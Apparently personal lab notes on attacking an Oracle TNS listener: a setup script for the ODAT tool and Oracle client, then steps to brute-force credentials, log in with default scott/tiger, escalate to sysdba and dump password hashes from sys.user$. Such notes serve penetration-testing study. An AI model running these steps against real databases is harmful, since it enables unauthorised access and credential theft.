- protocol that facilitates communication between oracle database and applications over networks
- Install these tools using bash script to start to enumerate it:
```bash
#!/bin/bash

sudo apt-get install libaio1 python3-dev alien -y
git clone https://github.com/quentinhardy/odat.git
cd odat/
git submodule init
git submodule update
wget https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-basic-linux.x64-21.12.0.0.0dbru.zip
unzip instantclient-basic-linux.x64-21.12.0.0.0dbru.zip
wget https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip
unzip instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip
export LD_LIBRARY_PATH=instantclient_21_12:$LD_LIBRARY_PATH
export PATH=$LD_LIBRARY_PATH:$PATH
pip3 install cx_Oracle
sudo apt-get install python3-scapy -y
sudo pip3 install colorlog termcolor passlib python-libnmap
sudo apt-get install build-essential libgmp-dev -y
pip3 install pycryptodome

```

- I installed sqlplus using this: sudo apt install oracle-instantclient-basic oracle-instantclient-sql
- Go to odat folder and run `./oday.py all -s IP_ADDRESS`
- Run :`sqlplus scott/tiger@10.129.204.235/XE` based on the credentials you get from above. The database is XE and scott/tiger is the username/password
- In the sql shell run: `select table_name from all_tables;`
- add `as sysdba` on the previous command to login as sysdba
- run `select name, password from sys.user$;` to get password hashes.